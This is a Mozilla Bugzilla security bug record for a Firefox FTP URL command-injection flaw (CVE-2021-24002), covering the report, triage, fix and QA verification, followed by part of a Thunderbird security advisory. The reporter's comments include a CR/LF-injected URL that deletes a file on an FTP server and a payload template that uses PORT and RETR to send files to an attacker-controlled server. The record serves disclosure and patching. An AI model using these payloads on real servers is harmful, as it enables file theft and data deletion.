[reporter-external] [client-bounty-form] [verif?][necko-triaged][adv-main88+] [adv-esr78.10+]

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a1100658_1689 "4 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (6 files)

| [ftps.py](/attachment.cgi?id=9212965)  [4 years ago](#c0)  [Daniel Santos](/user_profile?user_id=682752)   1.12 KB, text/x-python |  | [Details](/attachment.cgi?id=9212965&action=edit) |
| --- | --- | --- |
| [PoC video](/attachment.cgi?id=9212971)  [4 years ago](#c2)  [Daniel Santos](/user_profile?user_id=682752)   1.26 MB, video/mp4 |  | [Details](/attachment.cgi?id=9212971&action=edit) |
| [PoC malicious page](/attachment.cgi?id=9212972)  [4 years ago](#c3)  [Daniel Santos](/user_profile?user_id=682752)   308 bytes, text/html |  | [Details](/attachment.cgi?id=9212972&action=edit) |
| [PoC video - Remote download](/attachment.cgi?id=9212978)  [4 years ago](#c4)  [Daniel Santos](/user_profile?user_id=682752)   985.10 KB, video/mp4 |  | [Details](/attachment.cgi?id=9212978&action=edit) |
| [Bug 1702374 - Make sure FTP URL does not contain special characters r=#necko](/attachment.cgi?id=9214077)  [4 years ago](#c12)  [Valentin Gosu [:valentin] (he/him)](/user_profile?user_id=415378)   48 bytes, text/x-phabricator-request | RyanVM : [approval-mozilla-beta+](#c17 "4 years ago")  RyanVM : [approval-mozilla-esr78+](#c17 "4 years ago") | [Details](/attachment.cgi?id=9214077&action=edit) | [Review](/attachment.cgi?id=9214077) |
| [advisory.txt](/attachment.cgi?id=9215510)  [4 years ago](#c22)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   282 bytes, text/plain |  | [Details](/attachment.cgi?id=9215510&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Daniel Santos](/user_profile?user_id=682752)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1702374#c0)• 4 years ago |
|  | |

Attached file
[ftps.py](attachment.cgi?id=9212965)
— [Details](attachment.cgi?id=9212965&action=edit)

On Firefox 87.0 (64-bit) FTP URLs (e.g. ftp://xxxx/yyy) allow the control characters %0A and %0D as part of the filename. This allows an attacker to craft a link that when accessed by a victim with the proper permissions will execute arbitrary commands on the FTP server.

The following steps can be used to reproduce the issue:

* To emulate an FTP server, run the attached ftps.py FTP server (you need to install pyftpdlib first)
* On the same directory create a file named test
* Create an HTML page containing link like: <a href="ftp://[YOUR\_FTP\_SERVER\_ADDRESS]/A%0D%0ADELE%20test">Download</a>
* From a machine running Firefox 87.0 with network access to the FTP server access the malicious page and click on the link
* Check the test file is deleted

IMPACT

An attacker may force a victim to execute FTP commands on a server on which the attacker has no previous access. Moreover, allowing control characters in FTP URLs may permit NAT slipstreaming attacks depending on the victim's router's configuration and FTP ALG implementation.

Flags: sec-bounty?

|  | [Daniel Santos](/user_profile?user_id=682752)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1702374#c1)• 4 years ago |
|  | |

Another possibility is issuing a PORT command to a host under the attacker's control followed by a GET command. This would allow an attacker to download files to its server impersonating the victim who clicked the malicious link.

|  | [Daniel Santos](/user_profile?user_id=682752)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1702374#c2)• 4 years ago |
|  | |

Attached video
[PoC video](attachment.cgi?id=9212971)
— [Details](attachment.cgi?id=9212971&action=edit)

This is a PoC video demonstrating the attacker can make the user delete files on the FTP server by clicking the malicious link.

|  | [Daniel Santos](/user_profile?user_id=682752)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1702374#c3)• 4 years ago |
|  | |

Attached file
[PoC malicious page](attachment.cgi?id=9212972)
— [Details](attachment.cgi?id=9212972&action=edit)

This is the PoC HTML page used in the previously attached PoC video. In order to use this, you need to replace the [YOUR\_FTP\_SERVER\_ADDRESS] string in the page's link href attribute with an address of an FTP server you have running.

|  | [Daniel Santos](/user_profile?user_id=682752)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1702374#c4)• 4 years ago |
|  | |

Attached video
[PoC video - Remote download](attachment.cgi?id=9212978)
— [Details](attachment.cgi?id=9212978&action=edit)

PoC video showing the remote download attack variant. In this case, the attacker issues a PORT command followed by a RETR command to download a file from the FTP server to a server they control.

The following payload template can be used to replicate the attack:

ftp://[FTP\_SERVER]/file.txt%0D%0APORT%20[ATTACKER\_SERVER\_IP (e.g. 198,51,100,102)],31,64%0D%0ARETR%20[FILENAME\_TO\_DOWNLOAD]

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1702374#a43250_159069)• 4 years ago |

Group: firefox-core-security → network-core-securityComponent: Security → Networking: FTPProduct: Firefox → Core

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1702374#c5)• 4 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1702374&comment_id=15340915 "1 revision") |
|  | |

Annoying.... if COVID hadn't put a pause on disabling things ([bug 1625822](/show_bug.cgi?id=1625822 "RESOLVED INACTIVE - [Meta] List of breaking changes we cannot ship during COVID-19 (waiting for Firefox 79 and later)")) we would have gotten rid of FTP support last year ([bug 1574475](/show_bug.cgi?id=1574475 "RESOLVED FIXED - Remove FTP support")).

Not sure how bad this is in practice. An ftp server that allows deletions over anonymous FTP is in trouble with or without this bug. I imagine an attack scenario involves targeting a user who has recently logged in to an FTP server with the appropriate privileges to do destructive actions.

Valentin: how long do we remember FTP login credentials? Or is each connection a completely new session and the user:pass has to be present in each ftp:// URL ? If the attacker has to supply the credentials this isn't a very useful attack (though clearly a bug and unwanted behavior). If we remember auth for a server then this is kind of like a CSRF attack and much more severe

If it's the former we can probably just wait for FTP to die. If it's the latter we should fix it as a security bug without waiting.

Status: UNCONFIRMED → NEWDepends on: [kill-ftp](/show_bug.cgi?id=1574475 "RESOLVED FIXED - Remove FTP support")Ever confirmed: trueFlags: needinfo?(valentin.gosu)

|  | [Daniel Santos](/user_profile?user_id=682752)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1702374#c6)• 4 years ago |
|  | |

Just to clarify something, the attacker is not entering the credentials. The victim navigates to the malicious page and clicks on the "Download" link and firefox asks the victim for credentials if required.

The deletion PoC is just an example, but IMO the remote download is way more interesting. If an attacker makes a victim clicks on a malicious link inside a corporate network they could download files from an FTP server that is not even accessible from the Internet. In this case, the impact exists despite the FTP server requiring authentication or not.

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1702374#c7)• 4 years ago |
|  | |

The injection of an FTP PORT command is indeed noteworthy. To clarify on behalf of the reporter:

The way FTP works is that the client usually supplies an IP and port combination that the server is supposed to send its data to.

Given a known file path, the attacker can use the browser reach through a corporate firewall and tell the FTP server to send it to an IP address and port of the attackers choosing.

So this is a neat trick but as an info leak probably something like sec-low or sec-moderate...

|  | [Daniel Santos](/user_profile?user_id=682752)  Reporter |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1702374#c8)• 4 years ago |
|  | |

If it makes any difference, this is how I would score this vulnerability according to CVSS 3.1: AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:L. This vector results in a 5.5 score, so I would call it a medium severity vulnerability.

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1702374#c9)• 4 years ago |
|  | |

@Daniel Santos, we use <https://wiki.mozilla.org/Security_Severity_Ratings/Client> to rate a bug's severity.

|  | [Valentin Gosu [:valentin] (he/him)](/user_profile?user_id=415378)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1702374#c10)• 4 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #5](/show_bug.cgi?id=1702374#c5 "VERIFIED FIXED - Arbitrary ftp command execution using ftp URLs"))

> Annoying.... if COVID hadn't put a pause on disabling things ([bug 1625822](/show_bug.cgi?id=1625822 "RESOLVED INACTIVE - [Meta] List of breaking changes we cannot ship during COVID-19 (waiting for Firefox 79 and later)")) we would have gotten rid of FTP support last year ([bug 1574475](/show_bug.cgi?id=1574475 "RESOLVED FIXED - Remove FTP support")).
>
> Not sure how bad this is in practice. An ftp server that allows deletions over anonymous FTP is in trouble with or without this bug. I imagine an attack scenario involves targeting a user who has recently logged in to an FTP server with the appropriate privileges to do destructive actions.
>
> Valentin: how long do we remember FTP login credentials? Or is each connection a completely new session and the user:pass has to be present in each ftp:// URL ? If the attacker has to supply the credentials this isn't a very useful attack (though clearly a bug and unwanted behavior). If we remember auth for a server then this is kind of like a CSRF attack and much more severe

From a quick test with ftp://test.rebex.net/ user:demo password:password it seems we only request the password the first time.

A second navigation to that origin will not require a password, but even the first navigation would be problematic if the user doesn't inspect the URL bar.

Given that this also affects ESR, I think it needs fixing ASAP, even if I'm ripping out the FTP code in Firefox 90.

Assignee: nobody → valentin.gosuSeverity: -- → S2Type: task → defectFlags: needinfo?(valentin.gosu)Priority: -- → P1Whiteboard: [reporter-external] [client-bounty-form] [verif?] → [reporter-external] [client-bounty-form] [verif?][necko-triaged]

|  | [Valentin Gosu [:valentin] (he/him)](/user_profile?user_id=415378)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1702374#c11)• 4 years ago |
|  | |

It turns out we previously had a check for these special characters (added in [bug 250906](/show_bug.cgi?id=250906 "NEW - null (%00) in filename fakes extension (ftp, file)")) but I removed it when I removed nsIProtocolHandler.newURI in [bug 1536744](/show_bug.cgi?id=1536744 "RESOLVED FIXED - Make NS_NewURI work off main thread and remove nsIProtocolHandler.newURI") </facepalm>

Regressed by: [1536744](/show_bug.cgi?id=1536744 "RESOLVED FIXED - Make NS_NewURI work off main thread and remove nsIProtocolHandler.newURI")

|  | [BMO Automation](/user_profile?user_id=546015) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1702374#a564065_546015)• 4 years ago |

Has Regression Range: --- → yesKeywords: [regression](/buglist.cgi?keywords=regression&resolution=---)

|  | [Valentin Gosu [:valentin] (he/him)](/user_profile?user_id=415378)  Assignee |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1702374#c12)• 4 years ago |
|  | |

Attached file
[Bug 1702374 - Make sure FTP URL does not contain special characters r=#necko](attachment.cgi?id=9214077)
— [Details](attachment.cgi?id=9214077&action=edit)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1702374#a594337_1689)• 4 years ago |

Keywords: [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [Valentin Gosu [:valentin] (he/him)](/user_profile?user_id=415378)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1702374#c13)• 4 years ago |
|  | |

[Tracking Requested - why for this release]:

FTP is disabled in 88 but can still be enabled via pref or by a webextension.

FTP is still enabled in esr78

[status-firefox88](/buglist.cgi?f1=cf_status_firefox88&o1=isnotempty):
--- → [disabled](/buglist.cgi?f1=cf_status_firefox88&o1=equals&v1=disabled)
[status-firefox-esr78](/buglist.cgi?f1=cf_status_firefox_esr78&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr78&o1=equals&v1=affected)
[tracking-firefox88](/buglist.cgi?f1=cf_tracking_firefox88&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox88&o1=equals&v1=%3F)
[tracking-firefox-esr78](/buglist.cgi?f1=cf_tracking_firefox_esr78&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox_esr78&o1=equals&v1=%3F)

|  | [Valentin Gosu [:valentin] (he/him)](/user_profile?user_id=415378)  Assignee |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1702374#c14)• 4 years ago |
|  | |

Comment on [attachment 9214077](/attachment.cgi?id=9214077 "Bug 1702374 - Make sure FTP URL does not contain special characters r=#necko") [[details]](/attachment.cgi?id=9214077&action=edit "Bug 1702374 - Make sure FTP URL does not contain special characters r=#necko")

[Bug 1702374](/show_bug.cgi?id=1702374 "VERIFIED FIXED - Arbitrary ftp command execution using ftp URLs") - Make sure FTP URL does not contain special characters r=#necko

### Beta/Release Uplift Approval Request

* **User impact if declined**: This bug makes it possible for the attacker to execute arbitrary commands on the FTP server that the user has access to.

  FTP is disabled in 88 by default, but the user can still flip the pref. The pref can also be flipped by an extension via the webextension API, so it would be good to uplift this.
* **Is this code covered by automated tests?**: No
* **Has the fix been verified in Nightly?**: No
* **Needs manual test from QE?**: Yes
* **If yes, steps to reproduce**: See [comment 0](/show_bug.cgi?id=1702374#c0 "VERIFIED FIXED - Arbitrary ftp command execution using ftp URLs")
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Low risk because FTP is disabled by default on 88.
* **String changes made/needed**:

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**:
* **User impact if declined**: This bug makes it possible for the attacker to execute arbitrary commands on the FTP server that the user has access to.
* **Fix Landed on Version**:
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: The patch fixes a regression by rejecting URLs that contain embedded \r\n\0.

  We previously rejected such URLs, but the restriction was accidentally removed in [bug 1536744](/show_bug.cgi?id=1536744 "RESOLVED FIXED - Make NS_NewURI work off main thread and remove nsIProtocolHandler.newURI").
* **String or UUID changes made by this patch**:
[Attachment #9214077](/attachment.cgi?id=9214077&action=edit "Bug 1702374 - Make sure FTP URL does not contain special characters r=#necko") -
Flags: approval-mozilla-esr78?
[Attachment #9214077](/attachment.cgi?id=9214077&action=edit "Bug 1702374 - Make sure FTP URL does not contain special characters r=#necko") -
Flags: approval-mozilla-beta?

|  | [Valentin Gosu [:valentin] (he/him)](/user_profile?user_id=415378)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1702374#a632859_415378)• 4 years ago |

Flags: qe-verify+

|  | [Valentin Gosu [:valentin] (he/him)](/user_profile?user_id=415378)  Assignee |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1702374#c15)• 4 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/3337b723d61b8427bdff495a36f4a7f05ce0fe81>

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1702374#c16)• 4 years ago |
|  | |

I'm setting the 88/89 status to affected mainly for tracking reasons - as noted elsewhere in the bug, only ESR78 still has FTP support enabled by default.

[status-firefox87](/buglist.cgi?f1=cf_status_firefox87&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox87&o1=equals&v1=wontfix)
[status-firefox88](/buglist.cgi?f1=cf_status_firefox88&o1=isnotempty):
[disabled](/buglist.cgi?f1=cf_status_firefox88&o1=equals&v1=disabled) → [affected](/buglist.cgi?f1=cf_status_firefox88&o1=equals&v1=affected)
[status-firefox89](/buglist.cgi?f1=cf_status_firefox89&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox89&o1=equals&v1=affected)
[tracking-firefox88](/buglist.cgi?f1=cf_tracking_firefox88&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox88&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox88&o1=equals&v1=%2B)
[tracking-firefox89](/buglist.cgi?f1=cf_tracking_firefox89&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox89&o1=equals&v1=%2B)
[tracking-firefox-esr78](/buglist.cgi?f1=cf_tracking_firefox_esr78&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox_esr78&o1=equals&v1=%3F) → [88+](/buglist.cgi?f1=cf_tracking_firefox_esr78&o1=equals&v1=88%2B)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1702374#c17)• 4 years ago |
|  | |

Comment on [attachment 9214077](/attachment.cgi?id=9214077 "Bug 1702374 - Make sure FTP URL does not contain special characters r=#necko") [[details]](/attachment.cgi?id=9214077&action=edit "Bug 1702374 - Make sure FTP URL does not contain special characters r=#necko")

[Bug 1702374](/show_bug.cgi?id=1702374 "VERIFIED FIXED - Arbitrary ftp command execution using ftp URLs") - Make sure FTP URL does not contain special characters r=#necko

Approved for 88.0b9 and 78.10esr.

[Attachment #9214077](/attachment.cgi?id=9214077&action=edit "Bug 1702374 - Make sure FTP URL does not contain special characters r=#necko") -
Flags: approval-mozilla-esr78?
[Attachment #9214077](/attachment.cgi?id=9214077&action=edit "Bug 1702374 - Make sure FTP URL does not contain special characters r=#necko") -
Flags: approval-mozilla-esr78+
[Attachment #9214077](/attachment.cgi?id=9214077&action=edit "Bug 1702374 - Make sure FTP URL does not contain special characters r=#necko") -
Flags: approval-mozilla-beta?
[Attachment #9214077](/attachment.cgi?id=9214077&action=edit "Bug 1702374 - Make sure FTP URL does not contain special characters r=#necko") -
Flags: approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1702374#c18)• 4 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/1ec78ed0fe84>

[status-firefox88](/buglist.cgi?f1=cf_status_firefox88&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox88&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox88&o1=equals&v1=fixed)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1702374#c19)• 4 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr78/rev/4c647212b510>

[status-firefox-esr78](/buglist.cgi?f1=cf_status_firefox_esr78&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr78&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr78&o1=equals&v1=fixed)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1702374#c20)• 4 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/3337b723d61b>

Group: network-core-security → core-security-releaseStatus: NEW → RESOLVEDClosed: 4 years ago
[status-firefox89](/buglist.cgi?f1=cf_status_firefox89&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox89&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox89&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → 89 Branch

|  | [Mihai Boldan, Desktop QA [:mboldan]](/user_profile?user_id=551058) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1702374#a715701_551058)• 4 years ago |

QA Whiteboard: [qa-triaged]

|  | [Bogdan Maris, Desktop Test Engineering](/user_profile?user_id=458188) |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1702374#c21)• 4 years ago |
|  | |

Reproduced the initial issue described in [comment 0](/show_bug.cgi?id=1702374#c0 "VERIFIED FIXED - Arbitrary ftp command execution using ftp URLs"), verified that using latest Nightly 89.0a1, Firefox 88.0b9 and latest ESR build from treeherder this is not reproducible anymore.

Status: RESOLVED → VERIFIEDQA Whiteboard: [qa-triaged]
[status-firefox88](/buglist.cgi?f1=cf_status_firefox88&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox88&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox88&o1=equals&v1=verified)
[status-firefox89](/buglist.cgi?f1=cf_status_firefox89&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox89&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox89&o1=equals&v1=verified)
[status-firefox-esr78](/buglist.cgi?f1=cf_status_firefox_esr78&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox_esr78&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox_esr78&o1=equals&v1=verified)Flags: qe-verify+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1702374#a1091966_578488)• 4 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?][necko-triaged] → [reporter-external] [client-bounty-form] [verif?][necko-triaged][adv-main88+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1702374#c22)• 4 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9215510)
— [Details](attachment.cgi?id=9215510&action=edit)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1702374#a1100658_1689)• 4 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1702374#a1171109_578488)• 4 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?][necko-triaged][adv-main88+] → [reporter-external] [client-bounty-form] [verif?][necko-triaged][adv-main88+] [adv-esr78.10+]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1702374#a1327929_428608)• 4 years ago |

Alias: CVE-2021-24002

|  | [Daniel Santos](/user_profile?user_id=682752)  Reporter |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1702374#c23)• 4 years ago |
|  | |

Hi, how long should I wait before writing an article about how I found this bug?

Thanks,

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1702374#a20416601_1689)• 3 years ago |

Group: core-security-release

|  | [BMO Automation](/user_profile?user_id=546015) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1702374#a90214697_546015)• 11 months ago |

Product: Core → Core Graveyard

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1702374#a99853207_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1702374&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Daniel Santos](/user_profile?user_id=682752)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_5dd0f786_20250114_210542.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2021-14

## Security Vulnerabilities fixed in Thunderbird 78.10

Announced
April 19, 2021
Impact
high
Products
Thunderbird
Fixed in

* Thunderbird 78.10

*In general, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*

#### [#CVE-2021-23994: Out of bound write due to lazy initialization](#CVE-2021-23994)

Reporter
Abraruddin Khan and Omair
Impact
high
##### Description

A WebGL framebuffer was not initialized early enough, resulting in memory corruption and an out of bound write.

##### References

* [Bug 1699077](https://bugzilla.mozilla.org/show_bug.cgi?id=1699077)

#### [#CVE-2021-23995: Use-after-free in Responsive Design Mode](#CVE-2021-23995)

Reporter
Irvan Kurniawan
Impact
high
##### Description

When Responsive Design Mode was enabled, it used references to objects that were previously freed. We presume that with enough effort this could have been exploited to run arbitrary code.

##### References

* [Bug 1699835](https://bugzilla.mozilla.org/show_bug.cgi?id=1699835)

#### [#CVE-2021-23998: Secure Lock icon could have been spoofed](#CVE-2021-23998)

Reporter
Jordi Chancel
Impact
moderate
##### Description

Through complicated navigations with new windows, an HTTP page could have inherited a secure lock icon from an HTTPS page.

##### References

* [Bug 1667456](https://bugzilla.mozilla.org/show_bug.cgi?id=1667456)

#### [#CVE-2021-23961: More internal network hosts could have been probed by a malicious webpage](#CVE-2021-23961)

Reporter
Samy Kamkar, Ben Seri, and Gregory Vishnepolsky
Impact
moderate
##### Description

Further techniques that built on the slipstream research combined with a malicious webpage could have exposed both an internal network's hosts as well as services running on the user's local machine.

##### References

* [Bug 1677940](https://bugzilla.mozilla.org/show_bug.cgi?id=1677940)

